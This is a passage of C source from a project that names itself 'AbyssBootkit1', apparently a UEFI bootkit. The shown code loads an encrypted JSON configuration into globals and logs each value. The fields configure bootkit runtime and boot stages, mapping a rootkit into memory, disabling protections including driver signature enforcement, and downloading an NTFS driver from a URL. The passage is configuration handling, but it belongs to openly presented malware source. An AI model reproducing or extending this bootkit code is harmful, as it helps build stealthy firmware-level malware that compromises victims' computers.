		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_BannerImageSquid] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the BannerAscii configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the BannerAscii configuration");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerAscii, &Global_PreBootConfiguration_FunctionsConfiguration_BannerAscii, L"BannerAscii\r\n");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_BannerAscii] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the UEFIReadWriteNTFSDriver configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the UEFIReadWriteNTFSDriver configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriver, &Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver, L"UEFIReadWriteNTFSDriver");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the UEFIReadWriteNTFSDriverDownload configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the UEFIReadWriteNTFSDriverDownload configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverDownload, &Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverDownload, L"UEFIReadWriteNTFSDriverDownload");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverDownload] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the UEFIReadWriteNTFSDriverPath configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the UEFIReadWriteNTFSDriverPath configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverPath, &Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath, L"UEFIReadWriteNTFSDriverPath");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}

	// Normalize the retrieved path to remove any redundant backslashes.
	PreBootConfiguration_UtilsJson_NormalizeUefiPath(Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath);


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the UEFIReadWriteNTFSDriverURL configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the UEFIReadWriteNTFSDriverURL configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverURL, &Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverURL, L"UEFIReadWriteNTFSDriverURL");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverURL] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the AdditionalComponent configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the AdditionalComponent configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_AdditionalComponent, &Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent, L"AdditionalComponent");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the AdditionalComponentPath configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the AdditionalComponentPath configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_AdditionalComponentPath, &Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponentPath, L"AdditionalComponentPath");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponentPath] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}

	// Normalize the retrieved path to remove any redundant backslashes.
	PreBootConfiguration_UtilsJson_NormalizeUefiPath(Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponentPath);


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the BootkitRuntime configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the BootkitRuntime configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitRuntime, &Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime, L"BootkitRuntime\r\n");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the BootkitRuntimePath configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the BootkitRuntimePath configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitRuntimePath, &Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntimePath, L"BootkitRuntimePath");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntimePath] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}

	// Normalize the retrieved path to remove any redundant backslashes.
	PreBootConfiguration_UtilsJson_NormalizeUefiPath(Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntimePath);


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the BootkitBoot configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the BootkitBoot configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBoot, &Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot, L"BootkitBoot\r\n");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the BootkitBootMapRootkitToMemory configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the BootkitBootMapRootkitToMemory configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBootMapRootkitToMemory, &Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory, L"BootkitBootMapRootkitToMemory\r\n");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the BootkitBootMapRootkitToMemoryModule configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the BootkitBootMapRootkitToMemoryModule configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBootMapRootkitToMemoryModule, &Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemoryModule, L"BootkitBootMapRootkitToMemoryModule\r\n");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemoryModule] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the DisableProtections configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the DisableProtections configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_DisableProtections, &Global_PreBootConfiguration_FunctionsConfiguration_DisableProtections, L"DisableProtections\r\n");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_DisableProtections] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve and set the DisableProtectionsDSE configuration
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Retrieve and set the DisableProtectionsDSE configuration\r\n");

	Status = PreBootConfiguration_FunctionsConfiguration_SetGlobalVariablesFromJson(JsonString, Global_PreBootConfiguration_PayloadsEncryptedConfiguration_DisableProtectionsDSE, &Global_PreBootConfiguration_FunctionsConfiguration_DisableProtectionsDSE, L"DisableProtectionsDSE\r\n");

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - SetGlobalConfigurationFromJson [Global_PreBootConfiguration_FunctionsConfiguration_DisableProtectionsDSE] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (InitializeConfigurationFields) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



/**
	@brief          Prints (logs) the current value of every global configuration string.
	@details        After the JSON has been deserialized and the global variables populated, this function allows developers to quickly inspect their contents.
**/
VOID
PreBootConfiguration_FunctionsConfiguration_PrintConfigurationFields()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (PrintConfigurationFields) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Values
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_Screen", Global_PreBootConfiguration_FunctionsConfiguration_Screen ? Global_PreBootConfiguration_FunctionsConfiguration_Screen : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_Banner", Global_PreBootConfiguration_FunctionsConfiguration_Banner ? Global_PreBootConfiguration_FunctionsConfiguration_Banner : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_BannerImageAbyssSquid", Global_PreBootConfiguration_FunctionsConfiguration_BannerImageAbyssSquid ? Global_PreBootConfiguration_FunctionsConfiguration_BannerImageAbyssSquid : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_BannerImageSquid", Global_PreBootConfiguration_FunctionsConfiguration_BannerImageSquid ? Global_PreBootConfiguration_FunctionsConfiguration_BannerImageSquid : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_BannerAscii", Global_PreBootConfiguration_FunctionsConfiguration_BannerAscii ? Global_PreBootConfiguration_FunctionsConfiguration_BannerAscii : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver", Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver ? Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverDownload", Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverDownload ? Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverDownload : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverURL", Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverURL ? Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverURL : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath", Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath ? Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent", Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent ? Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponentPath", Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponentPath ? Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponentPath : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime", Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime ? Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntimePath", Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntimePath ? Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntimePath : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot", Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot ? Global_PreBootConfiguration_FunctionsConfiguration_BootkitBoot : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory", Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory ? Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemoryModule", Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemoryModule ? Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemoryModule : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_DisableProtections", Global_PreBootConfiguration_FunctionsConfiguration_DisableProtections ? Global_PreBootConfiguration_FunctionsConfiguration_DisableProtections : L"[NULL]");
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"    %-45s : %s\r\n", L"Global_PreBootConfiguration_FunctionsConfiguration_DisableProtectionsDSE", Global_PreBootConfiguration_FunctionsConfiguration_DisableProtectionsDSE ? Global_PreBootConfiguration_FunctionsConfiguration_DisableProtectionsDSE : L"[NULL]");


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootConfiguration [Functions/Configuration.c] (PrintConfigurationFields) - Bye\r\n");
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
